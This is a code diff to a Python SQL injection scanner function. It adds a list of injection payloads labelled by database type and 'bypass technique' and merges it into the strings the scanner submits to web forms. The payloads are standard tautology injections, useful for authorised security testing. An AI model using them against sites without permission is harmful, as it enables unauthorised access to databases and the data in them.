@@ -82,6 +82,26 @@ def sql_injection_scan(url, session):
     # SQL injection payload variations for form testing
     payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1; --", "1\" OR 1=1; --"]
 
+    # Additional payloads for different DBMS and bypass techniques
+    additional_payloads = [
+        "1' OR '1'='1' -- ",        # MySQL payloads
+        "1' OR '1'='1'; -- ",
+        "1' OR '1'='1' # ",
+        "1' OR '1'='1'; -- ",        # PostgreSQL payloads
+        "1' OR '1'='1'-- ",
+        "1' OR '1'='1'-- -",
+        "1' OR '1'='1'--",           # MSSQL payloads
+        "1' OR '1'='1'--/*",
+        "1' OR '1'='1' --",
+        "1' OR 1=1; --",             # Bypass techniques
+        "1\" OR 1=1; --",
+        "1' OR 'x'='x'; --",
+        "1' OR 1=1 LIMIT 1; --",
+    ]
+
+    # Combine the original and additional payloads
+    payloads.extend(additional_payloads)
+
     for form in forms:
         details = form_details(form)
 
